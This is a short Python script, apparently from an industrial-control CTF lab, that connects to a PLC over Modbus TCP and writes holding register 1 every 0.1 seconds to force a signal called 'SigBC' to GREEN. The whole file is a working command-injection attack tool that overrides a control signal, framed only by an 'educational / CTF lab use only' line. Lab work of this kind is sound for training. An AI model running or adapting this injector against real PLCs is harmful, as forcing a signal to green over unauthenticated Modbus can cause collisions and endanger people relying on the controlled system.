#!/usr/bin/env python3
"""
sigbc_injector.py

Forces SigBC (HR[1]) = 1 (GREEN) continuously.
Educational / CTF lab use only.
"""

import time
from pymodbus.client import ModbusTcpClient

PLC_IP = "127.0.0.1"
PLC_PORT = 5020
PLC_UNIT = 1

SIG_BC_ADDR = 1      # Holding Register 1
SIG_BC_GREEN = 1

WRITE_INTERVAL = 0.1  # seconds

def run_injector():
    print("[*] Starting SigBC injector (forcing GREEN)")
    client = None

    try:
        while True:
            if client is None or not client.connected:
                client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                if not client.connect():
                    print("[-] PLC not reachable, retrying...")
                    time.sleep(1)
                    continue
                print("[+] Connected to PLC")

            # Write HR[1] = 1 (GREEN)
            try:
                client.write_register(
                    SIG_BC_ADDR,
                    SIG_BC_GREEN,
                    slave=PLC_UNIT
                )
                print("[>] SigBC forced to GREEN (HR[1]=1)")
            except TypeError:
                # pymodbus v2 fallback
                client.write_register(
                    SIG_BC_ADDR,
                    SIG_BC_GREEN,
                    unit=PLC_UNIT
                )
                print("[>] SigBC forced to GREEN (legacy API)")

            time.sleep(WRITE_INTERVAL)

    except KeyboardInterrupt:
        print("\n[*] Injection stopped by user")

    finally:
        if client:
            client.close()
        print("[*] Injector exited cleanly")

if __name__ == "__main__":
    run_injector()
